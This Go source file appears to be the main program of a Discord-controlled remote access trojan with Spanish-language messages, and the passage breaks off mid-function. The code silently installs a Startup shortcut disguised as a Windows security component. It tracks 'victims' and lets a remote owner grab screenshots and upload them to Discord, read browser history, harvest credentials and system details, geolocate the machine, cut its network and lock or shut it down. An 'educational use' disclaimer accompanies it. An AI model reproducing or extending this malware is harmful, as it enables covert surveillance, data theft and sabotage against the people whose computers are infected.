package main

import (
	"bufio"
	"discord-remote-control/internal/utils"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
)

type Config struct {
	Prefix  string `json:"prefix"`
	OwnerID string `json:"owner_id"`
	GuildID string `json:"guild_id"`
}

type Command struct {
	Name        string
	Description string
	Execute     func(s *discordgo.Session, m *discordgo.MessageCreate, args []string)
}

type Victim struct {
	ID       string    `json:"id"`
	Hostname string    `json:"hostname"`
	OS       string    `json:"os"`
	IP       string    `json:"ip"`
	LastSeen time.Time `json:"last_seen"`
}

var (
	commands      = make(map[string]Command)
	config        Config
	victimManager *utils.VictimManager
)

func getToken() string {

	exePath, err := os.Executable()
	if err != nil {
		log.Printf("⚠️ Error obteniendo ruta del ejecutable: %v", err)
	}

	configPath := filepath.Join(filepath.Dir(exePath), "config.json")
	configFile, err := os.ReadFile(configPath)
	if err == nil {
		var tokenConfig struct {
			Token string `json:"token"`
		}
		if json.Unmarshal(configFile, &tokenConfig) == nil && tokenConfig.Token != "" {
			log.Println("✅ Token obtenido desde config.json")
			return tokenConfig.Token
		}
	}

	token := os.Getenv("DISCORD_BOT_TOKEN")
	if token != "" {
		log.Println("✅ Token obtenido desde variable de entorno")
		return token
	}

	tokenPath := filepath.Join(filepath.Dir(exePath), "token.txt")
	if tokenBytes, err := os.ReadFile(tokenPath); err == nil {
		token = strings.TrimSpace(string(tokenBytes))
		if token != "" {
			log.Println("✅ Token obtenido desde token.txt")
			return token
		}
	}

	fmt.Println("❌ No se encontró el token del bot.")
	fmt.Println("Por favor, crea un archivo 'token.txt' con el token del bot")
	fmt.Println("o configura la variable de entorno DISCORD_BOT_TOKEN")
	fmt.Println("Presiona Enter para salir...")
	bufio.NewReader(os.Stdin).ReadString('\n')
	os.Exit(1)
	return ""
}

func init() {
	log.SetFlags(log.Ltime | log.Ldate | log.Lshortfile)

	exePath, err := os.Executable()
	if err != nil {
		log.Printf("⚠️ Error obteniendo ruta del ejecutable: %v", err)
		exePath, _ = os.Getwd()
	}

	configPath := filepath.Join(filepath.Dir(exePath), "config.json")
	log.Printf("📁 Buscando config.json en: %s", configPath)

	configFile, err := os.ReadFile(configPath)
	if err != nil {
		log.Fatalf("❌ Error leyendo config.json: %v", err)
	}

	if err := json.Unmarshal(configFile, &config); err != nil {
		log.Fatalf("❌ Error parseando config.json: %v", err)
	}

	log.Printf("✅ Configuración cargada - Prefix: %s, OwnerID: %s", config.Prefix, config.OwnerID)

	registerCommands()
	log.Printf("✅ Comandos registrados: %d comandos disponibles", len(commands))

	victimManager = utils.NewVictimManager()

	if runtime.GOOS == "windows" {
		exePath, err := os.Executable()
		if err == nil {
			startupPath := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Start Menu\Programs\Startup`)
			shortcutPath := filepath.Join(startupPath, "SecurityHealthSystrays.lnk")

			cmd := exec.Command("powershell", "-Command",
				fmt.Sprintf(`$WS = New-Object -ComObject WScript.Shell; 
				$SC = $WS.CreateShortcut("%s");
				$SC.TargetPath = "%s";
				$SC.Save()`, shortcutPath, exePath))
			cmd.Run()
		}
	}
}

func main() {
	startTime = time.Now()
	log.Println("🎓 Software creado con fines educativos y de pruebas personales")
	log.Println("⚠️ El usuario es responsable del uso que le dé a esta herramienta")
	log.Println("🚀 Iniciando bot...")

	token := getToken()
	if token == "" {
		log.Fatal("❌ No se pudo obtener el token del bot")
	}
	log.Printf("✅ Token obtenido correctamente")

	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		log.Fatalf("❌ Error creando la sesión de Discord: %v", err)
	}

	dg.Identify.Intents = discordgo.IntentsAll

	dg.AddHandler(func(s *discordgo.Session, r *discordgo.Ready) {
		log.Printf("✅ Bot está listo! Conectado como: %s#%s", s.State.User.Username, s.State.User.Discriminator)

		s.UpdateGameStatus(0, "!help")

		channels, _ := s.GuildChannels(config.GuildID)
		var targetChannel string
		for _, ch := range channels {
			if ch.Type == discordgo.ChannelTypeGuildText {
				if ch.Name == "general" {
					targetChannel = ch.ID
					break
				} else if targetChannel == "" {
					targetChannel = ch.ID
				}
			}
		}

		if targetChannel != "" {
			embed := &discordgo.MessageEmbed{
				Title:       "🚀 Bot de Control Remoto Iniciado",
				Description: "Bot iniciado y listo para usar!\nUsa `!help` para ver los comandos disponibles.",
				Color:       0x00ff00,
				Fields: []*discordgo.MessageEmbedField{
					{
						Name:   "Estado",
						Value:  "✅ Conectado",
						Inline: true,
					},
					{
						Name:   "Versión",
						Value:  "1.0",
						Inline: true,
					},
				},
				Footer: &discordgo.MessageEmbedFooter{
					Text: "Bot creado por todo hack official",
				},
			}
			s.ChannelMessageSendEmbed(targetChannel, embed)
		}
	})

	dg.AddHandler(messageCreate)
	dg.AddHandler(handleButtons)

	err = dg.Open()
	if err != nil {
		log.Fatalf("❌ Error conectando con Discord: %v", err)
	}

	victimManager.SetSession(dg, config.OwnerID)

	log.Println("✅ Bot iniciado correctamente. Presiona CTRL+C para salir.")

	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM)
	<-sc

	dg.Close()
}

func registerCommands() {
	commands["help"] = Command{
		Name:        "help",
		Description: "Muestra la lista de comandos disponibles",
		Execute:     cmdHelp,
	}
	commands["system"] = Command{
		Name:        "system",
		Description: "Muestra información completa del sistema",
		Execute: func(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
			var output strings.Builder

			output.WriteString("💻 INFORMACIÓN DEL SISTEMA\n")
			if sysInfo, err := utils.GetSystemInfo(); err == nil {
				output.WriteString(fmt.Sprintf("\n=== Sistema ===\n%s\n", sysInfo))
			}

			if runtime.GOOS == "windows" {
				if out, err := exec.Command("wmic", "cpu", "get", "caption,name,numberofcores,maxclockspeed").Output(); err == nil {
					output.WriteString(fmt.Sprintf("\n=== CPU ===\n%s\n", string(out)))
				}
			} else {
				if out, err := exec.Command("cat", "/proc/cpuinfo").Output(); err == nil {
					output.WriteString(fmt.Sprintf("\n=== CPU ===\n%s\n", string(out)))
				}
			}

			if runtime.GOOS == "windows" {
				if out, err := exec.Command("wmic", "OS", "get", "FreePhysicalMemory,TotalVisibleMemorySize", "/Value").Output(); err == nil {
					output.WriteString(fmt.Sprintf("\n=== Memoria RAM ===\n%s\n", string(out)))
				}
			} else {
				if out, err := exec.Command("free", "-h").Output(); err == nil {
					output.WriteString(fmt.Sprintf("\n=== Memoria RAM ===\n%s\n", string(out)))
				}
			}

			if runtime.GOOS == "windows" {
				if out, err := exec.Command("wmic", "logicaldisk", "get", "size,freespace,caption").Output(); err == nil {
					output.WriteString(fmt.Sprintf("\n=== Discos ===\n%s\n", string(out)))
				}
			} else {
				if out, err := exec.Command("df", "-h").Output(); err == nil {
					output.WriteString(fmt.Sprintf("\n=== Discos ===\n%s\n", string(out)))
				}
			}

			if info, err := utils.GetDetailedNetworkInfo(); err == nil {
				output.WriteString(fmt.Sprintf("\n=== Red ===\nIP Pública: %s\nIP Local: %s\nDNS: %s\n",
					info.PublicIP, info.LocalIP, strings.Join(info.DNSServers, ", ")))
			}

			if runtime.GOOS == "windows" {
				if out, err := exec.Command("net", "start").Output(); err == nil {
					output.WriteString(fmt.Sprintf("\n=== Servicios ===\n%s\n", string(out)))
				}
			}

			fullOutput := output.String()
			maxLength := 1900

			for i := 0; i < len(fullOutput); i += maxLength {
				end := i + maxLength
				if end > len(fullOutput) {
					end = len(fullOutput)
				}
				chunk := fullOutput[i:end]
				s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("```\n%s\n```", chunk))
			}
		},
	}
	commands["status"] = Command{
		Name:        "status",
		Description: "Muestra el estado del sistema",
		Execute:     cmdStatus,
	}
	commands["screenshot"] = Command{
		Name:        "screenshot",
		Description: "Toma una captura de pantalla y la envía",
		Execute:     cmdScreenshot,
	}
	commands["remove"] = Command{
		Name:        "remove",
		Description: "Elimina el ejecutable y lo quita del inicio",
		Execute: func(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
			err := removeExecutable()
			if err != nil {
				s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("❌ Error al eliminar el ejecutable: %v", err))
			} else {
				s.ChannelMessageSend(m.ChannelID, "✅ Ejecutable eliminado correctamente.")
			}
		},
	}
	commands["time"] = Command{
		Name:        "time",
		Description: "Muestra la hora actual del sistema",
		Execute:     cmdShowTime,
	}
	commands["slowwifi"] = Command{
		Name:        "slowwifi",
		Description: "Ralentiza el WiFi al máximo (puede dejar sin conexión)",
		Execute:     cmdSlowWiFi,
	}
	commands["location"] = Command{
		Name:        "location",
		Description: "Muestra la localización aproximada por IP y enlace a Google Maps",
		Execute:     cmdLocation,
	}
	commands["ipinfo"] = Command{
		Name:        "ipinfo",
		Description: "Muestra la IP pública y local",
		Execute:     cmdIPInfo,
	}
	commands["blockall"] = Command{
		Name:        "blockall",
		Description: "Bloquea el sistema completamente",
		Execute:     cmdBlockAll,
	}
	commands["alert"] = Command{
		Name:        "alert",
		Description: "Envía una alerta sonora con el mensaje indicado",
		Execute:     cmdAlert,
	}
	commands["openurl"] = Command{
		Name:        "openurl",
		Description: "Abre una URL en el navegador predeterminado",
		Execute:     cmdOpenURL,
	}
	commands["reboot"] = Command{
		Name:        "reboot",
		Description: "Reinicia el sistema",
		Execute:     cmdReboot,
	}
	commands["shutdown"] = Command{
		Name:        "shutdown",
		Description: "Apaga el sistema",
		Execute:     cmdShutdown,
	}
	commands["credentials"] = Command{
		Name:        "credentials",
		Description: "Obtiene credenciales y datos sensibles del sistema",
		Execute:     cmdGetCredentials,
	}
	commands["startup"] = Command{
		Name:        "startup",
		Description: "Lista los programas de inicio",
		Execute:     cmdListStartup,
	}
	commands["updates"] = Command{
		Name:        "updates",
		Description: "Verifica actualizaciones pendientes",
		Execute:     cmdCheckUpdates,
	}
}

var startTime time.Time

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	log.Printf("📩 Mensaje recibido de %s (%s): %s", m.Author.Username, m.Author.ID, m.Content)

	if m.Author.ID == s.State.User.ID {
		log.Printf("🤖 Ignorando mensaje propio")
		return
	}

	if m.Author.ID != config.OwnerID {
		log.Printf("❌ Usuario no autorizado. ID recibido: %s, Owner esperado: %s", m.Author.ID, config.OwnerID)
		s.ChannelMessageSend(m.ChannelID, "⚠️ No tienes permiso para usar este bot.")
		return
	}

	if m.Content == "!tho" {
		log.Printf("🎯 Mostrando panel de control")
		sendControlPanel(s, m.ChannelID)
		return
	}

	if strings.HasPrefix(m.Content, config.Prefix) {
		command := strings.TrimPrefix(m.Content, config.Prefix)
		args := strings.Fields(command)

		if len(args) == 0 {
			return
		}

		cmdName := args[0]
		args = args[1:]

		log.Printf("🛠️ Comando recibido: %s, Argumentos: %v", cmdName, args)

		if cmd, exists := commands[cmdName]; exists {
			log.Printf("✅ Ejecutando comando: %s", cmd.Name)
			cmd.Execute(s, m, args)
		} else {
			log.Printf("❌ Comando no reconocido: %s", cmdName)
			s.ChannelMessageSend(m.ChannelID, "❌ Comando no reconocido. Usa `!help` para ver los comandos disponibles.")
		}
	}
}

func sendControlPanel(s *discordgo.Session, channelID string) {
	embed := &discordgo.MessageEmbed{
		Title:       "🎯 Panel de Control Avanzado",
		Description: "Sistema de Control y Monitoreo v3.0",
		Color:       0xff0000,
		Fields: []*discordgo.MessageEmbedField{
			{
				Name:   "🔴 Estado",
				Value:  "Activo",
				Inline: true,
			},
			{
				Name:   "👥 Clientes",
				Value:  fmt.Sprintf("%d conectados", len(victimManager.GetActiveVictims())),
				Inline: true,
			},
			{
				Name:   "⚡ Uptime",
				Value:  time.Since(startTime).Round(time.Second).String(),
				Inline: true,
			},
		},
	}

	_, err := s.ChannelMessageSendEmbed(channelID, embed)
	if err != nil {
		log.Printf("❌ Error enviando el panel de control: %v", err)
	}
}

func handleButtons(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if i.Member.User.ID != config.OwnerID {
		return
	}

	switch i.MessageComponentData().CustomID {
	case "btn_clients":
		showClientsList(s, i)
	case "btn_system":
		showSystemInfo(s, i)
	case "btn_screenshot":
		handleScreenshotButton(s, i)
	case "btn_webcam":
		captureWebcam(s, i)
	case "btn_history":
		getBrowserHistory(s, i)
	case "btn_passwords":
		getStoredPasswords(s, i)
	case "btn_network":
		getNetworkInfo(s, i)
	case "btn_block_pc":
		blockPC(s, i)
	case "btn_send_alert":
		showAlertModal(s, i)
	case "btn_os_info":
		showOSInfo(s, i)
	case "btn_slow_wifi":
		handleSlowWiFiButton(s, i)
	case "btn_location":
		handleLocationButton(s, i)
	case "btn_block_all":
		handleBlockAllButton(s, i)
	case "btn_alert":
		handleAlertButton(s, i)
	case "btn_open_url":
		handleOpenURLButton(s, i)
	}
}

func handleScreenshotButton(s *discordgo.Session, i *discordgo.InteractionCreate) {
	filename, err := utils.CaptureScreen()
	if err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "❌ Error al capturar pantalla: " + err.Error(),
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}
	file, err := os.Open(filename)
	if err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "❌ Error al abrir la captura: " + err.Error(),
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}
	defer file.Close()
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "📸 Captura de pantalla tomada:",
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
	s.ChannelFileSend(i.ChannelID, filename, file)
	os.Remove(filename)
}

func handleSlowWiFiButton(s *discordgo.Session, i *discordgo.InteractionCreate) {
	err := utils.SlowDownWiFi()
	if err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "❌ Error al ralentizar el WiFi: " + err.Error(),
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "📶 WiFi ralentizado al máximo. La conexión debería ser inutilizable.",
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
}

func handleLocationButton(s *discordgo.Session, i *discordgo.InteractionCreate) {
	ip, loc, link := getLocationInfo()
	content := fmt.Sprintf("🌍 Localización aproximada:\nIP: `%s`\nUbicación: `%s`\n[Ver en Google Maps](%s)", ip, loc, link)
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: content,
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
}

func handleBlockAllButton(s *discordgo.Session, i *discordgo.InteractionCreate) {
	message := "SISTEMA BLOQUEADO POR DISCORD"

	err := utils.BlockSystem(message)
	if err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "❌ Error al bloquear el sistema: " + err.Error(),
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "🛑 Sistema bloqueado completamente.",
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
}

func handleAlertButton(s *discordgo.Session, i *discordgo.InteractionCreate) {
	msg := "¡Alerta activada desde Discord!"
	err := utils.SendAlert(msg)
	if err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "❌ Error al enviar alerta: " + err.Error(),
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "🔊 Alerta sonora enviada.",
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
}

func handleOpenURLButton(s *discordgo.Session, i *discordgo.InteractionCreate) {
	url := "https://www.google.com"
	err := openURL(url)
	if err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "❌ Error al abrir URL: " + err.Error(),
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "🌐 URL abierta en el navegador.",
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
}

func cmdScreenshot(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	filename, err := utils.CaptureScreen()
	if err != nil {
		s.ChannelMessageSend(m.ChannelID, "❌ Error al capturar pantalla: "+err.Error())
		return
	}
	file, err := os.Open(filename)
	if err != nil {
		s.ChannelMessageSend(m.ChannelID, "❌ Error al abrir la captura: "+err.Error())
		return
	}
	defer file.Close()
	s.ChannelMessageSend(m.ChannelID, "📸 Captura de pantalla tomada:")
	s.ChannelFileSend(m.ChannelID, filename, file)
	os.Remove(filename)
}

func cmdSlowWiFi(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	s.ChannelMessageSend(m.ChannelID, "📶 Iniciando ataque al WiFi... Deshabilitando todas las conexiones de red")

	err := utils.SlowDownWiFi()
	if err != nil {
		s.ChannelMessageSend(m.ChannelID, "❌ Error al deshabilitar el WiFi: "+err.Error())
		return
	}

	s.ChannelMessageSend(m.ChannelID, "✅ WiFi y conexiones de red deshabilitadas exitosamente\n"+
		"⚠️ El equipo ha quedado sin conexión a internet\n"+
		"📝 Para restaurar la conexión, reinicia el sistema")
}

func cmdLocation(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	ip, loc, link := getLocationInfo()
	s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("🌍 Localización aproximada:\nIP: `%s`\nUbicación: `%s`\n[Ver en Google Maps](%s)", ip, loc, link))
}

func cmdIPInfo(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	info := getNetworkDetails()
	s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("🌐 IP Pública: `%s`\n🏠 IP Local: `%s`", info.PublicIP, info.LocalIP))
}

func cmdBlockAll(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	message := "SISTEMA BLOQUEADO"
	if len(args) > 0 {
		message = strings.Join(args, " ")
	}

	s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("🛑 Bloqueando sistema con mensaje: '%s'...", message))

	err := utils.BlockSystem(message)
	if err != nil {
		s.ChannelMessageSend(m.ChannelID, "❌ Error al bloquear el sistema: "+err.Error())
		return
	}
	s.ChannelMessageSend(m.ChannelID, "🛑 Sistema bloqueado completamente.")
}

func cmdAlert(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	msg := strings.Join(args, " ")
	if msg == "" {
		msg = "¡Alerta activada desde Discord!"
	}
	err := utils.SendAlert(msg)
	if err != nil {
		s.ChannelMessageSend(m.ChannelID, "❌ Error al enviar alerta: "+err.Error())
		return
	}
	s.ChannelMessageSend(m.ChannelID, "🔊 Alerta sonora enviada.")
}

func cmdOpenURL(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	if len(args) == 0 {
		s.ChannelMessageSend(m.ChannelID, "❌ Debes indicar una URL.")
		return
	}
	url := args[0]
	err := openURL(url)
	if err != nil {
		s.ChannelMessageSend(m.ChannelID, "❌ Error al abrir URL: "+err.Error())
		return
	}
	s.ChannelMessageSend(m.ChannelID, "🌐 URL abierta en el navegador.")
}

func removeExecutable() error {
	return utils.DeleteExecutable()
}

func cmdShowTime(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	now := time.Now().Format("02-01-2006 15:04:05")
	s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("🕒 Hora actual del sistema: `%s`", now))
}

func cmdReboot(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	err := utils.RebootPC()
	if err != nil {
		s.ChannelMessageSend(m.ChannelID, "❌ Error al reiniciar: "+err.Error())
		return
	}
	s.ChannelMessageSend(m.ChannelID, "♻️ Reiniciando el sistema...")
}

func cmdShutdown(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	err := utils.ShutdownPC()
	if err != nil {
		s.ChannelMessageSend(m.ChannelID, "❌ Error al apagar: "+err.Error())
		return
	}
	s.ChannelMessageSend(m.ChannelID, "⏻ Apagando el sistema...")
}

func getLocationInfo() (ip, location, mapsLink string) {
	resp, err := http.Get("http://ip-api.com/line/?fields=query,city,regionName,country,lat,lon")
	if err != nil {
		return "Error", "Error", "https://maps.google.com"
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	lines := strings.Split(string(body), "\n")
	if len(lines) < 6 {
		return "Error", "Error", "https://maps.google.com"
	}
	ip = lines[0]
	city := lines[1]
	region := lines[2]
	country := lines[3]
	lat := lines[4]
	lon := lines[5]
	location = fmt.Sprintf("%s, %s, %s", city, region, country)
	mapsLink = fmt.Sprintf("https://maps.google.com/?q=%s,%s", lat, lon)
	return
}

func openURL(url string) error {
	switch runtime.GOOS {
	case "windows":
		return exec.Command("rundll32", "url.dll,FileProtocolHandler", url).Start()
	case "linux":
		return exec.Command("xdg-open", url).Start()
	case "darwin":
		return exec.Command("open", url).Start()
	default:
		return fmt.Errorf("sistema operativo no soportado para abrir URLs")
	}
}

func cmdHelp(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	embed := &discordgo.MessageEmbed{
		Title:       "📚 Comandos Disponibles",
		Description: "Lista de todos los comandos disponibles",
		Color:       0x00ff00,
		Fields:      []*discordgo.MessageEmbedField{},
		Footer: &discordgo.MessageEmbedFooter{
			Text: "BOT DE CONTROL REMOTO MEDIANTE DISCORD | BY TODO HACK OFFICIAL | discord.gg/uPESr5v7yQ",
		},
	}

	categories := map[string][]*Command{
		"🖥️ Sistema Principal": {},
		"🌐 Red y Conexiones":   {},
		"🔒 Seguridad":          {},
		"🛠️ Herramientas":      {},
		"� Datos y Acceso":     {},
	}

	for _, cmd := range commands {
		switch cmd.Name {
		case "system", "cpu", "ram", "disk", "processes", "services":
			categories["🖥️ Sistema"] = append(categories["🖥️ Sistema"], &Command{Name: cmd.Name, Description: cmd.Description})
		case "network", "ipinfo", "location", "slowwifi":
			categories["🌐 Red"] = append(categories["🌐 Red"], &Command{Name: cmd.Name, Description: cmd.Description})
		case "blockall", "screenshot", "alert":
			categories["🔒 Seguridad"] = append(categories["🔒 Seguridad"], &Command{Name: cmd.Name, Description: cmd.Description})
		case "reboot", "shutdown", "time", "openurl":
			categories["🛠️ Utilidades"] = append(categories["🛠️ Utilidades"], &Command{Name: cmd.Name, Description: cmd.Description})
		default:
			categories["💻 Información"] = append(categories["💻 Información"], &Command{Name: cmd.Name, Description: cmd.Description})
		}
	}

	for category, cmds := range categories {
		if len(cmds) > 0 {
			var commandList string
			for _, cmd := range cmds {
				commandList += fmt.Sprintf("`%s%s` - %s\n", config.Prefix, cmd.Name, cmd.Description)
			}
			embed.Fields = append(embed.Fields, &discordgo.MessageEmbedField{
				Name:  category,
				Value: commandList,
			})
		}
	}

	s.ChannelMessageSendEmbed(m.ChannelID, embed)
}

func cmdStatus(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	status := utils.BasicSystemStatus()
	s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("```\n%s\n```", status))
}

func blockPC(s *discordgo.Session, i *discordgo.InteractionCreate) {
	err := utils.LockPC()
	if err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "❌ Error al bloquear la pantalla: " + err.Error(),
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "🔒 Pantalla bloqueada correctamente.",
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
}

func showClientsList(s *discordgo.Session, i *discordgo.InteractionCreate) {
	victims := victimManager.GetActiveVictims()
	if len(victims) == 0 {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "No hay victimas activos.",
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}
	content := "**📋 Informacion de la victima Conectado**\n\n"
	for _, v := range victims {
		content += fmt.Sprintf("🔹 **%s**\n└ OS: %s | IP: %s | Último acceso: %s\n",
			v.Hostname, v.OS, v.IP, v.LastSeen.Format("02-01-2006 15:04:05"))
	}
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: content,
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
}

func showSystemInfo(s *discordgo.Session, i *discordgo.InteractionCreate) {
	sysInfo, err := utils.GetSystemInfo()
	if err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "❌ Error obteniendo información del sistema: " + err.Error(),
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}

	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: fmt.Sprintf("💻 Información del sistema:\n```\n%s\n```", sysInfo),
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
}

func captureWebcam(s *discordgo.Session, i *discordgo.InteractionCreate) {
	var content = "🎥 Capturando imagen de la webcam..."
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: content,
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})

	time.Sleep(1 * time.Second)
	content = "⚠️ La captura de webcam está deshabilitada por razones de seguridad y privacidad"
	s.InteractionResponseEdit(i.Interaction, &discordgo.WebhookEdit{
		Content: &content,
	})
}

func getBrowserHistory(s *discordgo.Session, i *discordgo.InteractionCreate) {
	browserData, err := utils.GetBrowserData()
	if err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "❌ Error obteniendo historial: " + err.Error(),
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}

	content := "🌐 Historial del navegador (últimas 10 URLs):\n```\n"
	for i, url := range browserData.URLs {
		if i >= 10 {
			break
		}
		content += fmt.Sprintf("%d. %s\n", i+1, url)
	}
	content += "```"

	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: content,
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
}

func getStoredPasswords(s *discordgo.Session, i *discordgo.InteractionCreate) {
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "Contraseñas guardadas (implementación pendiente)",
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
}

func getNetworkInfo(s *discordgo.Session, i *discordgo.InteractionCreate) {
	info, err := utils.GetDetailedNetworkInfo()
	if err != nil {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "❌ Error obteniendo información de red: " + err.Error(),
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}

	content := fmt.Sprintf("🌐 Información de red:\n"+
		"IP Pública: `%s`\n"+
		"IP Local: `%s`\n"+
		"DNS Servers: `%s`\n"+
		"Conexiones activas:\n```\n%s\n```",
		info.PublicIP,
		info.LocalIP,
		strings.Join(info.DNSServers, ", "),
		strings.Join(info.Connections, "\n"))

	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: content,
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
}

func showAlertModal(s *discordgo.Session, i *discordgo.InteractionCreate) {
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "Mostrar alerta modal (implementación pendiente)",
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
}

func showOSInfo(s *discordgo.Session, i *discordgo.InteractionCreate) {
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
